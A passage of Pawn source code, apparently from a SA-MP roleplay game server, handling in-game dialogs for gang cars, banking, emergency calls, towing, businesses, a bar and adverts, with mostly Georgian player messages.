			format(query,sizeof(query),"UPDATE `members` SET `gunamount` = '%d', `ammo` = '%d' WHERE `nickname` = '%s'",pData[playerid][pGunAmount],pData[playerid][pAmmo],Name2(playerid));
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Moxda Shecdoma mysql");
			GivePlayerWeaponEx(playerid,weaponid,ammo);
			MeAction(playerid,"собрал оружие");
		}
		case dBuyGangCar:
		{
			if(!response) return true;
			new model = gGangCarModelID[listitem];
			new modelid = model - 400;
			new price = gTransport[modelid][trPrice];
			if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
			new fractionid = pData[playerid][pFraction] - 1;
			new gangid = fractionid - 2;
			new slot = -1;
			for(new i;i<5;i++)
			{
				if(!gGangCars[gangid][i] || gGangCars[gangid][i] == 481) {slot = i; break;}
			}
			if(slot == -1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Tavisufali Adgili Avtomobilshi");
			gGangCars[gangid][slot] = model;
			new data[64],query[128];
			for(new i;i<5;i++)
			{
				if(!i) format(data,sizeof(data),"%d",gGangCars[gangid][i]);
				else format(data,sizeof(data),"%s|%d",data,gGangCars[gangid][i]);
			}
			format(query,sizeof(query),"UPDATE `gangs` SET `cars` = '%s' WHERE `id` = '%d'",data,gangid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma Mysql (Bandis Transportis Yidvisas)");
			TransferMoney(playerid,-1,price);
			SendClientMessage(playerid,CGREEN,"Bandis Avtomobili Nayidia. Gamoiyenet /grespawn");
		}
		case dSellGangCar:
		{
			if(!response) return true;
			new idx;
			new slot = strval(strtok(inputtext,idx)) - 1;
			if(slot < 0 || slot > 4) return SendClientMessage(playerid,CGRAY,"Shida Shecdoma");
			if(!IsGang(pData[playerid][pFraction])) return SendClientMessage(playerid,CGRAY,"Shida Shecdoma 2");
			new gangid = pData[playerid][pFraction] - 3;
			if(!gGangCars[gangid][slot] || gGangCars[gangid][slot] == 481) return SendClientMessage(playerid,CGRAY,"Am Adgilas Ar Aris Avtomobili, Romelic Sheidzleba Gaiyidos");
			SetPVarInt(playerid,"gangsellcarslot",slot);
			new modelid = gGangCars[gangid][slot] - 400;
			new price = floatround(gTransport[modelid][trPrice]*0.2);
			SetPVarInt(playerid,"gangsellcarprice",price);
			format(mes,sizeof(mes),"{"#cWHITE"}Namdvilad Gsurt Gayidot %s Fasad: {"#cGREEN"}$%d?",gTransport[modelid][trName],price);
			ShowPlayerDialog(playerid,dSellGangCar2,0,"Bandis Manqanis Gayidva",mes,"YES","NO");
		}
		case dSellGangCar2:
		{
			if(!response) return true;
			new slot = GetPVarInt(playerid,"gangsellcarslot");
			new price = GetPVarInt(playerid,"gangsellcarprice");
			if(slot < 0 || slot > 4) return SendClientMessage(playerid,CGRAY,"Shida Shecdoma");
			if(!IsGang(pData[playerid][pFraction])) return SendClientMessage(playerid,CGRAY,"Shida Shecdoma 2");
			new gangid = pData[playerid][pFraction] - 3;
			if(!gGangCars[gangid][slot] || gGangCars[gangid][slot] == 481) return SendClientMessage(playerid,CGRAY,"Am Adgilas Ar Aris Avtomobili, Romelic Sheidzleba Gaiyidos");
			gGangCars[gangid][slot] = 481;
			new data[64],query[128];
			for(new i;i<5;i++)
			{
				if(!i) format(data,sizeof(data),"%d",gGangCars[gangid][i]);
				else format(data,sizeof(data),"%s|%d",data,gGangCars[gangid][i]);
			}
			format(query,sizeof(query),"UPDATE `gangs` SET `cars` = '%s' WHERE `id` = '%d'",data,gangid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma Mysql (Bandis Avtomobilis Gayidvisas)");
			TransferMoney(-1,playerid,price);
			SendClientMessage(playerid,CGREEN,"Avtomobili Gaiyida. Gamoiyenet /grespawn");
		}
		case dBank:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0:
				{
					format(mes,sizeof(mes),"{"#cWHITE"}Tqvens Sabanko Angarishze Aris: {"#cGREEN"}%d$",pData[playerid][pBank]);
					ShowPlayerDialog(playerid,dATMWatch,0,"{"#cYELLOW"}Sabanki Angarishi",mes,"Ukan","Daxurva");
				}
				case 1: ShowPlayerDialog(playerid,dATMGet,1,"{"#cYELLOW"}Sabanko Momsaxureba","{"#cWHITE"}Miutitet Tanxis Raodenoba, Ramdenis Agebac Gsurt:","Ageba","Daxurva");
				case 2: ShowPlayerDialog(playerid,dATMPut,1,"{"#cYELLOW"}Sabanko Momsaxureba","{"#cWHITE"}Miutitet Tanxis Raodenoba, Ramdenis Shetanac Gsurt:","Shetana","Daxurva");
				case 3:
				{
				    if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Saxli");
					new houseid = pData[playerid][pHouse] - 1;
					if(gHouses[houseid][houseDay] >= 6) return SendClientMessage(playerid, CGRAY, "Tqven Arshegidzliat Gadaixadot Fuli 6 Dgeze Metistvis.");
                    if(pData[playerid][pBank] < 700) return SendClientMessage(playerid, CGRAY, "Tqven Argaqvt Sakmarisi Fuli Bankshi.");
					new query[128];
					format(query,sizeof(query),"UPDATE `houses` SET `day` = '%d' WHERE id = '%d'",gHouses[houseid][houseDay]+1,houseid+1);
					mysql_empty(mysql, query);
			  		pData[playerid][pBank] -= 700;
			  		UpdatePlayerData(playerid,"bank",pData[playerid][pBank]);
		  		    gHouses[houseid][houseDay] += 1;
					Kazna += 1000;
		  		    SendClientMessage(playerid, CGREEN, "Tqven Warmatebit Daasrulet Saijaro Moqmedeba 1 Dgeshi. Obieqti Amogebuli Iqna Bankis Mier.");
		  		    ShowPlayerDialog(playerid,dBank,2,"{"#cYELLOW"}Sabanko Momsaxureba","1. Balansi\n2. Tanxis Gamotana\n3. Tanxis Shetana\n4. Saxelmwifo Gadasaxadebi\n5. Biznesis Gadasaxadebi","Archeva","Uaryofa");
				}
				case 4:
				{
				    if(pData[playerid][pBusiness] < 1) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Biznesi");
			    	new businessid = pData[playerid][pBusiness] - 1;
			    	if(gBusiness[businessid][busiDeliving] >= 6) return SendClientMessage(playerid, CGRAY, "Tqven Arshegidzliat Gadaixadot Fuli 6 Dgeze Metistvis.");
                    if(pData[playerid][pBank] < 700) return SendClientMessage(playerid, CGRAY, "Tqven Argaqvt Sakmarisi Fuli Bankshi.");
                    new query[128];
					format(query,sizeof(query),"UPDATE `business` SET `deliving` = '%d' WHERE id = '%d'",gBusiness[businessid][busiDeliving]+1,businessid+1);
					mysql_empty(mysql, query);
			  		pData[playerid][pBank] -= 700;
			  		UpdatePlayerData(playerid,"bank",pData[playerid][pBank]);
		  		    gBusiness[businessid][busiDeliving] += 1;
		  		    Kazna += 1000;
		  		    SendClientMessage(playerid, CGREEN, "Tqven Warmatebit Ganaaxlet Biznesi 1 Dgeshi, Obieqti Amogebuli Iqna Bankis Mier.");
		  		    ShowPlayerDialog(playerid,dBank,2,"{"#cYELLOW"}Sabanko Momsaxureba","1. Balansi\n2. Tanxis Gamotana\n3. Tanxis Shetana\n4. Saxelmwifo Gadasaxadebi\n5. Biznesis Gadasaxadebi","Archeva","Uaryofa");
				}
			}
		}
		case dSubleader:
		{
			if(!response) return true;
			if(!listitem) return true;
			new id = GetPVarInt(playerid,"actsubleader");
			if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
			new subid = listitem - 1;
			new fractionid = pData[playerid][pFraction] - 1;
			new frid = GetSubfractionID(fractionid);
			new skinid = gFractionSkin[fractionid][0];
			pData[id][pFraction] = fractionid + 1;
			pData[id][pRank] = pData[playerid][pRank] - 1;
			pData[id][pSubfraction] = subid + 1;
			new query[200];
			format(query,sizeof(query),"UPDATE `members` SET `fraction` = '%d', `rank` = '%d', `fractionskin` = '%d', `subfraction` = '%d' WHERE `nickname` = '%s'",pData[id][pFraction],pData[id][pRank],skinid,pData[id][pSubfraction],Name2(id));
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1 (Gaitvaliwinet Subqraciaze)");
			format(mes,sizeof(mes),"%s Dagnishnes Liderad Suborganizaciis %s: \"%s\"",Name2(playerid),gFractionName[fractionid],gSubfractionName[frid][subid]);
			SendClientMessage(id,CINFO,mes);
			format(mes,sizeof(mes),"Tqven Danishnet %s Suborganizaciis Martvelad: \"%s\"",Name2(id),gSubfractionName[frid][subid]);
			SendClientMessage(playerid,CINFO,mes);
			new houseid = pData[id][pHouse]-1;
			if(houseid == -1) SetPlayerSkin(id,skinid);
			else if(!gHouses[houseid][houseImprove][1]) SetPlayerSkin(id,skinid);
			else
			{
				if(GetPlayerSkin(id) == gHouses[houseid][houseSkin][3]) SetPlayerSkin(id,skinid);
				gHouses[houseid][houseSkin][3] = skinid;
				UpdateHouseDress(houseid);
				SendClientMessage(id,CINFO,"Organizaciis Tansacmeli Aris Tqvens Karadashi.");
			}

		}
		case dStopLoad:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
			else
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				if(!vehicleid) return true;
				if(gVehicleGun[vehicleid][vGunLoading] == false && gVehicleGun[vehicleid][vGunUnloading] == false) return true;
				gVehicleGun[vehicleid][vGunLoading] = false;
				gVehicleGun[vehicleid][vGunUnloading] = false;
				if(IsValid3DTextLabel(gVehicleGun[vehicleid][vGunText])) DestroyDynamic3DTextLabelEx(gVehicleGun[vehicleid][vGunText]);
				DestroyDynamicArea(gVehicleGun[vehicleid][vGunArea]);
				DestroyDynamicPickup(gVehicleGun[vehicleid][vGunPickup]);
				gVehicleGun[vehicleid][vGunArea] = 0;
				gVehicleGun[vehicleid][vGunPickup] = 0;
				SendClientMessage(playerid,CGREEN,"Datvirtva / Gadmotvirtva Srulad");
			}
		}
		case dService:
		{
			if(!response) return true;
			new job,jobname[24];
			switch(listitem)
			{
				case 0: {job = 3; jobname = "Taqsisti";}
				case 1: {job = 4; jobname = "Meqaniki";}
			}
			SFCM(playerid,CGREEN,"Ближайшие %s:",jobname);
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i) || pData[i][pJob] != job) continue;
				if(pData[i][pPhone]) format(mes,sizeof(mes),"%s Teleponi. %d ( %.0fm )",Name2(i),pData[i][pPhone],GetPlayerDistanceToPlayer(playerid,i));
				else format(mes,sizeof(mes),"%s Teleponi. Ara ( %.0fm )",Name2(i),GetPlayerDistanceToPlayer(playerid,i));
				SendClientMessage(playerid,CWHITE,mes);
			}
		}
		case dEmergencyCall:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0:ShowPlayerDialog(playerid,dEmergencyPolice1,1,"Policia","{"#cWHITE"}Mogesalmebit. Agweret Sitvacia:","ОК","CLOSE");
				case 1:ShowPlayerDialog(playerid,dEmergencyMedic1,1,"Mokle Daxmareba","{"#cWHITE"}Mogesalmebit. Agweret Sitvacia:","ОК","CLOSE");
				case 2:
				{
					if(gEmCall[2] != INVALID_PLAYER_ID)
					{
						SendClientMessage(playerid,CGRAY,"Telepon Dakavebulia");
						return OnPlayerCommandText(playerid,"/c 911");
					}
					ShowPlayerDialog(playerid,dEmergencyMechanic1,1,"Buqsiri / Meqaniki","{"#cWHITE"}Mogesalmebit. Agweret Sitvacia:","ОК","CLOSE");
				}
			}
		}
		case dEmergencyPolice1:
		{
			if(!response) return true;
			new Float:x, Float:y, Float:z,pos[5];
			GetPlayerPos(playerid,x,y,z);
			if(x < 0) strcat(pos,"SF");
			else if(y > 100.0) strcat(pos,"LV");
			else strcat(pos,"LS");
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i)) continue;
				if(pData[i][pFraction] != 9) continue;
				format(mes,sizeof(mes),"[D] %s Policiis Gamodzaxeba (%s). Zaris Gansaxorcieleblad Sheiyvanet {"#cWHITE"}/pc",Name2(playerid),pos);
				SendClientMessage(i,CDEPARTMENT,mes);
				format(mes,sizeof(mes),"[D] Mizezi: %s",inputtext);
				SendClientMessage(i,CDEPARTMENT,mes);
			}
			gEmCall[0] = playerid;
			ShowPlayerDialog(playerid,dMes,0,"Policia","{"#cWHITE"}Gamodzaxeba Migebulia. Daelodet","ОК","");
		}
		case dEmergencyMedic1:
		{
			if(!response) return true;
			new Float:x, Float:y, Float:z,pos[5];
			GetPlayerPos(playerid,x,y,z);
			if(x < 0) strcat(pos,"SF");
			else if(y > 100.0) strcat(pos,"LV");
			else strcat(pos,"LS");
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i)) continue;
				if(pData[i][pFraction] != 2) continue;
				format(mes,sizeof(mes),"[D] %s Saswrapo Daxmarebis Gamodzaxeba (%s). Zaris Gansaxorcieleblad Sheiyvanet {"#cWHITE"}/mc",Name2(playerid),pos);
				SendClientMessage(i,CDEPARTMENT,mes);
				format(mes,sizeof(mes),"[D] Mizezi: %s",inputtext);
				SendClientMessage(i,CDEPARTMENT,mes);

			}
			gEmCall[1] = playerid;
			ShowPlayerDialog(playerid,dMes,0,"Saswrapo Daxmareba","{"#cWHITE"}Gamodzaxeba Migebulia. Daelodet","ОК","");
		}
		case dEmergencyMechanic1:
		{
			if(!response) return true;
			if(gEmCall[2] != INVALID_PLAYER_ID)
			{
				SendClientMessage(playerid,CGRAY,"Teleponi Dakavebulia");
				return OnPlayerCommandText(playerid,"/c 911");
			}
			new Float:x, Float:y, Float:z,pos[5];
			GetPlayerPos(playerid,x,y,z);
			if(x < 0) strcat(pos,"SF");
			else if(y > 100.0) strcat(pos,"LV");
			else strcat(pos,"LS");
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i)) continue;
				if(pData[i][pJob] != 4 || pTemp[i][pMechID] == INVALID_VEHICLE_ID) continue;
				format(mes,sizeof(mes),"[Dispecheri] %s Meqanikis Gamodzaxeba (%s). Zaris Gansaxorcieleblad Sheiyvanet {"#cWHITE"}/rc",Name2(playerid),pos);
				SendClientMessage(i,CDEPARTMENT,mes);
				format(mes,sizeof(mes),"[Dispecheri] Mizezi: %s",inputtext);
				SendClientMessage(i,CDEPARTMENT,mes);

			}
			gEmCall[2] = playerid;
			ShowPlayerDialog(playerid,dMes,0,"Buqsiri","{"#cWHITE"}Gamodzaxeba Migebulia. Daelodet","ОК","");
		}
		case dMechRent:
		{
			if(!response)
			{
				RemovePlayerFromVehicle(playerid);
				return true;
			}
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
			new vehicleid = GetPlayerVehicleID(playerid);
			SendClientMessage(playerid,CGREEN,"Tqven Iqiravet Buqsiri.");
			SendClientMessage(playerid,CYELLOW,"/tow {"#cWHITE"} -  Gtavazobt Mdzgoli 2 Avtomobilis Daqiravebas.");
			SendClientMessage(playerid,CYELLOW,"/unfill {"#cWHITE"} - Gtavazobt Benzinis Amogebas");
			TransferMoney(playerid,-1,500);
			pTemp[playerid][pMechID] = vehicleid;
		}
		case dTow:
		{
			if(!response) return true;
			new trailer = GetPlayerVehicleID(playerid);
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || !trailer) return true;
			new towcode = GetPVarInt(playerid,"towcode");
			new offer = GetPVarInt(playerid,"towoffer");
			new offee = GetPVarInt(playerid,"towoffee");
			if(offee != playerid) return SendClientMessage(playerid,CGRAY,"Shecdoma");
			if(strlen(inputtext) != 5 || strval(inputtext) != towcode) return SendClientMessage(playerid,CGRAY,"Kodi Arasworad Aris sheyvanili.");
			if(GetPlayerDistanceToPlayer(playerid,offer) > 10.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(offer)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
			RemovePlayerFromVehicle(playerid);
			new vehicleid = pTemp[offer][pMechID];
			SetTimerEx("AttachTrailerToVehicleEx",3000,false,"ii",trailer,vehicleid);
			SetPVarInt(playerid,"towvid",vehicleid);
			SetPVarInt(playerid,"towactvid",trailer);
			SendClientMessage(playerid,CINFO,"Avtomobili shegidzliat Gamoiyenot Momdevno 3 Wamshi An Daweret: {"#cWHITE"}/untow");
		}
		case dUnfill:
		{
			if(!response) return true;
			new trailer = GetPlayerVehicleID(playerid);
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || !trailer) return true;
			new towcode = GetPVarInt(playerid,"towcode");
			new offer = GetPVarInt(playerid,"towoffer");
			new offee = GetPVarInt(playerid,"towoffee");
			if(offee != playerid) return SendClientMessage(playerid,CGRAY,"Shecdoma");
			if(strlen(inputtext) != 5 || strval(inputtext) != towcode) return SendClientMessage(playerid,CGRAY,"Kodi Arasworadaa Sheyvanili.");
			if(GetPlayerDistanceToPlayer(playerid,offer) > 10.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(offer)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
			gVehicles[trailer - 1][vFuel] = 0.0;
			SendClientMessage(playerid,CINFO,"Tqveni Avtomobilis Sawvavma Da Gazis Avzma Daiklo");
			SendClientMessage(offer,CINFO,"Tqven Dagvaret Tqveni Klientis Sawvavis Avzi");
		}
		case dBuyBusiness1:
		{
			if(!response) return true;
			new businessid = pTemp[playerid][pSelectedBusinessID];
			if(businessid < 0) return true;
			if(gBusiness[businessid][busiOwnerID]) return SendClientMessage(playerid, CGRAY, "Es Biznesi Ukve Gayidulia.");
			format(mes,sizeof(mes),"{"#cWHITE"}Namdvilad Gsurt Gadaixadot Am Bizneesshi {"#cRED"}$%d?",gBusiness[businessid][busiSellPrice]);
			ShowPlayerDialog(playerid,dBuyBusiness2,0,"Biznesi",mes,"OK","NO");
		}
		case dBuyBusiness2:
		{
			if(!response) return true;
			new businessid = pTemp[playerid][pSelectedBusinessID];
			if(businessid < 0) return true;
			if(gBusiness[businessid][busiOwnerID]) return SendClientMessage(playerid, CGRAY, "Es Biznesi Ukve Gayidulia.");
			new price = gBusiness[businessid][busiSellPrice];
			if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt Arasakmarisi Tanxa Am Biznesis Shesadzenad.");
			if(pData[playerid][pBusiness]) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Gaqvt Biznesi.");
			new query[128];
			format(query,sizeof(query),"UPDATE `business` SET `ownerid` = '%d', `owner` = '%s' WHERE `id` = '%d'",pData[playerid][pMysqlID],Name2(playerid),businessid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL (#99)");
			gBusiness[businessid][busiOwnerID] = pData[playerid][pMysqlID];
			SetString(gBusiness[businessid][busiOwner],Name2(playerid));
			SendClientMessage(playerid,CGREEN,"Gilocavt Tqven Sheidzinet Biznesi.");
			SendClientMessage(playerid,CWHITE,"/business {"#cINFO"}- Biznesis Samartavad.");
			gBusiness[businessid][busiBank] = 0;
			gBusiness[businessid][busiProduct] = 100;
			UpdateBusinessText(businessid);
			UpdateBusinessDataEx(businessid+1,"product",gBusiness[businessid][busiProduct],"bank",gBusiness[businessid][busiBank]);
			PlayerPlaySound(playerid,1185,0.0,0.0,0.0);
			SetTimerEx("PlayerPlaySoundDelay",6900,false,"ii",playerid,1186);
			UpdateBusinessText(businessid);
			UpdatePlayerData(playerid,"bussiness",businessid+1);
			pData[playerid][pBusiness] = gBusiness[businessid][busiID];
			TransferMoney(playerid,-1,price);
		}
		case dBusiness:
		{
			if(!response) return true;
			new id = pData[playerid][pBusiness] - 1;
			if(id < 0) return true;
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,dBusinessBank,2,"Biznesi","1. Naxet Tanxa Salaroshi\n2. Sheinaxet Tanxa Salaroshi\n3. Aiget Tanxa Salarodan","NEXT","BACK");
				case 1: ShowPlayerDialog(playerid,dBusinessOrder1,1,"Biznesi","{"#cWHITE"}Miutitet Produqtis Raodenoba:\n{"#cGRAY"}(1Prod. = {"#cRED"}$1{"#cGRAY"})","Shekveta","Daxurva");
				case 2: ShowBusinessInformation(playerid,id,dBusinessStat);
				case 3: ShowPlayerDialog(playerid,dBusinessPrice,1,"Biznesi","{"#cWHITE"}Miutitet 1-Produqtis Fasi (1$-Dan 15$-Mde)","OK","CLOSE");
				case 4: //Закр - откр
				{
					if(gBusiness[id][busiStatus])
					{
						gBusiness[id][busiStatus] = 0;
						SendClientMessage(playerid,CINFO,"Biznesi Daiketa.");
					}
					else
					{
						gBusiness[id][busiStatus] = 1;
						SendClientMessage(playerid,CINFO,"Biznesi Gaigo.");
					}
					UpdateBusinessData(id+1,"status",gBusiness[id][busiStatus]);
					UpdateBusinessText(id);
				}
				case 5: //Продажа
				{
					format(mes,sizeof(mes),"{"#cWHITE"}Darwmunebuli Xart Rom Gsurt Gayidot Tqveni Bizensi? Fasad: {"#cGREEN"}$%d\n{"#cGRAY"}(Tu Gsurt Rom Miyidot Sxva Motamashes Biznesi Daweret: /sellbusiness [ID Motamashis] [Fasi])",gBusiness[id][busiSellPrice]);
					ShowPlayerDialog(playerid,dBusinessSell,0,"Biznesi",mes,"OK","NO");
				}
			}
		}
		case dBusinessOrder1:
		{
			if(!response) OnPlayerCommandText(playerid,"/business");
			new id = pData[playerid][pBusiness] - 1;
			if(id < 0) return true;
			new prod = strval(inputtext);
			if(prod < 1 || prod > 30000) return SendClientMessage(playerid,CGRAY,"Araswori Produqtis Raodenoba");
			if(prod + gBusiness[id][busiProduct] > 30000) return SendClientMessage(playerid,CGRAY,"Tqven Arshegildziat Sheinaxot 30-Ataze Meti Produqti");
			new price = prod;
			if(GetPlayerMoneyEx(playerid) < price)
			{
				SFCM(playerid,CGRAY,"Tqven Gchirdebat $%d Rom Sheukvetot %d Atasi. Produqti",price,prod);
				return true;
			}
			SetPVarInt(playerid,"orderprod",prod);
			SPFD(playerid,dBusinessOrder2,0,"Biznesi","YES","NO","{"#cWHITE"} Darwmunebulixart Rom Gsurt Sheukvetot %d Atasi. Produqti Fasad: $%d?",prod,price);
		}
		case dBusinessOrder2:
		{
			if(!response) OnPlayerCommandText(playerid,"/business");
			new id = pData[playerid][pBusiness] - 1;
			if(id < 0) return true;
			new prod = GetPVarInt(playerid,"orderprod");
			if(prod < 1 || prod > 30000) return SendClientMessage(playerid,CGRAY,"Araswori Prdouqtebis Raodenoba");
			if(prod + gBusiness[id][busiProduct] > 30000) return SendClientMessage(playerid,CGRAY,"Tqven Arshegildziat Sheinaxot 30-Ataze Meti Produqti");
			new price = prod;
			if(GetPlayerMoneyEx(playerid) < price)
			{
				SFCM(playerid,CGRAY,"Tqven Gchirdebat $%d Rom Sheukvetot %d Atasi. Produqti",price,prod);
				return true;
			}
			TransferMoney(playerid,-1,price);
			gBusiness[id][busiProduct] += prod;
			UpdateBusinessData(id+1,"product",gBusiness[id][busiProduct]);
			UpdateBusinessText(id);
			SendClientMessage(playerid,CGREEN,"Produqti Shetanilia Tqvens Biznesshi.");
		}
		case dBusinessStat:
		{
			OnPlayerCommandText(playerid,"/business");
		}
		case dBusinessBank:
		{
			if(!response) return OnPlayerCommandText(playerid,"/business");
			new id = pData[playerid][pBusiness] - 1;
			switch(listitem)
			{
				case 0:
				{
					format(mes,sizeof(mes),"{"#cWHITE"}Salaroshia: {"#cGREEN"}$%d",gBusiness[id][busiBank]);
					ShowPlayerDialog(playerid,dBusinessStat,0,"Biznesi",mes,"OK","");
				}
				case 1:
				{
					ShowPlayerDialog(playerid,dBusinessPut,1,"Biznesi","Miutitet Tanxa, Ramdenis Shetanac Gsurt Salarishi","Shetana","Daxurva");
				}
				case 2:
				{
					ShowPlayerDialog(playerid,dBusinessGet,1,"Biznesi","Miutitet Tanxa, Ramdenis Gamotanac Gsurt Salarodan","Gamotana","Daxurva");
				}
			}
		}
		case dBusinessPut:
		{
			if(!response) return OnPlayerCommandText(playerid,"/business");
			new id = pData[playerid][pBusiness] - 1;
			new sum = strval(inputtext);
			if(sum < 1) return SendClientMessage(playerid,CGRAY,"Araswori Tanxa");
			if(GetPlayerMoneyEx(playerid) < sum) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa Xelze");
			if(UpdateBusinessData(id+1,"bank",gBusiness[id][busiBank] + sum)) return SendClientMessage(playerid,CGRAY,"Dafiqsirda Shecdoma MySQL");
			gBusiness[id][busiBank] += sum;
			TransferMoney(playerid,-1,sum);
			MeAction(playerid,"Sheitana Fuli Salaroshi");
			OnPlayerCommandText(playerid,"/business");
		}
		case dBusinessGet:
		{
			if(!response) return OnPlayerCommandText(playerid,"/business");
			new id = pData[playerid][pBusiness] - 1;
			new sum = strval(inputtext);
			if(sum < 1) return SendClientMessage(playerid,CGRAY,"Araswori Tanxa");
			if(gBusiness[id][busiBank] < sum) return SendClientMessage(playerid,CGRAY,"Salaroshi Ar Aris Sakmarisi Tanxa");
			if(UpdateBusinessData(id+1,"bank",gBusiness[id][busiBank] - sum)) return SendClientMessage(playerid,CGRAY,"Dafiqsirda Shecdoma MySQL");
			gBusiness[id][busiBank] -= sum;
			TransferMoney(-1,playerid,sum);
			MeAction(playerid,"Gamoitana Fuli Salarodan");
			OnPlayerCommandText(playerid,"/business");
		}
		case dBusinessSell:
		{
			if(!response) return OnPlayerCommandText(playerid,"/business");
			if(pData[playerid][pBusiness] < 1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Biznesi");
			new id = pData[playerid][pBusiness] - 1;
			new sum = gBusiness[id][busiSellPrice];
			if(UpdateBusinessData(id+1,"ownerid",0)) return SendClientMessage(playerid,CGRAY,"Dafiqsirda Shecdoma MySQL (#102)");
			gBusiness[id][busiOwnerID] = 0;
			gBusiness[id][busiStatus] = 1;
			SetString(gBusiness[id][busiOwner],"");
			new query[128];
			format(query,sizeof(query),"UPDATE `business` SET `ownerid` = '0', `owner` = '', `status` = '1' WHERE `id` = '%d'",id+1);
			mysql_empty(mysql, query);
			UpdateBusinessText(id);
			UpdatePlayerData(playerid,"bussiness",0);
			pData[playerid][pBusiness] = 0;
			TransferMoney(-1,playerid,sum);
			SendClientMessage(playerid,CGREEN,"Biznesi Gayida Saxelmwifom.");
		}
		case dBusinessPrice:
		{
			if(!response) OnPlayerCommandText(playerid,"/business");
			new id = pData[playerid][pBusiness] - 1;
			if(id < 0) return true;
			new price = strval(inputtext);
			if(price < 1 || price > 15) return SendClientMessage(playerid,CGRAY,"Araswori Fasi.");
			gBusiness[id][busiPrice] = price;
			UpdateBusinessData(id+1,"price",price);
			UpdateBusinessText(id);
			SendClientMessage(playerid,CGREEN,"Axali Produqtis Fasi Dayenda.");
		}
		case dBints:
		{
			if(!response) return true;
			new Float:x,Float:y, Float:z;
			GetPlayerPos(playerid,x,y,z);
			SetPVarFloat(playerid,"oldx",x);
			SetPVarFloat(playerid,"oldy",y);
			SetPVarFloat(playerid,"oldz",z);
			SetPVarInt(playerid,"oldint",GetPlayerInterior(playerid));
			SetPVarInt(playerid,"oldworld",GetPlayerVirtualWorld(playerid));
			SetPlayerInterior(playerid,gBints[listitem][bintInterior]);
			SetPlayerPos(playerid,gBints[listitem][bintX],gBints[listitem][bintY],gBints[listitem][bintZ]);
		}
		case dBar:
		{
			if(!response) return true;
			new id = pTemp[playerid][pSelectedBusinessID];
			if(id < 0) return true;
			new price = gBarCosts[listitem];
			if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
			if(gBusiness[id][busiProduct] < gBarCosts[listitem] * 4) return SendClientMessage(playerid,CGRAY,"Barshi Ar Aris Sakmarisi Produqti");
			format(mes,sizeof(mes),"Iyida %s",gBarNames[listitem]);
			MeAction(playerid,mes);
			TransferMoney(playerid,-1,price);
			gBusiness[id][busiProduct] -= gBarCosts[listitem] * 4;
			gBusiness[id][busiBank] += price;
			UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
			UpdateBusinessText(id);
			SendClientMessage(playerid, -1, "Nayidi Produqti Daemateba Inventarshi.");
			pTemp[playerid][pEda][listitem+4] += 1;
			updateEda(playerid);
			SaveEda(playerid);
		}
		case dAdvertSend:
		{
			if(!response) return true;
			if(gAdvertCount >= MAX_ADVERT_COUNT) return SendClientMessage(playerid,CGRAY,"Samwuxarod, Gancxadebebis Sistema Gadatvirtulia, Scadet Mogvianebit");
			new text[100];
			GetPVarString(playerid,"advert",text,100);
			DeletePVar(playerid,"advert");
			new price = strlen(text) * gAdvertPrice;
			if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
			gAdvertCount ++;
			new slot = -1;
			for(new i;i<MAX_ADVERT_COUNT;i++)
			{
				if(!gAdvert[i][adBusy]) {slot = i; break;}
			}
			if(slot == -1) return SendClientMessage(playerid,CGRAY,"Shecdoma (#111)");
			TransferMoney(playerid,-1,price);
			gAdvert[slot][adMoney] = price;
			format(gAdvert[slot][adSender],24,"%s",Name2(playerid));
			gAdvert[slot][adPhone] = pData[playerid][pPhone];
			format(gAdvert[slot][adText],100,"%s",text);
			gAdvert[slot][adBusy] = true;
		}
		case dAdvertList:
		{
			if(!response) return true;
			if(!gAdvert[listitem][adBusy] || gAdvert[listitem][adCheked] || gAdvert[listitem][adCheking]) return ShowAdvertList(playerid);
			SetPVarInt(playerid,"editadvert",listitem);
			gAdvert[listitem][adCheking] = true;
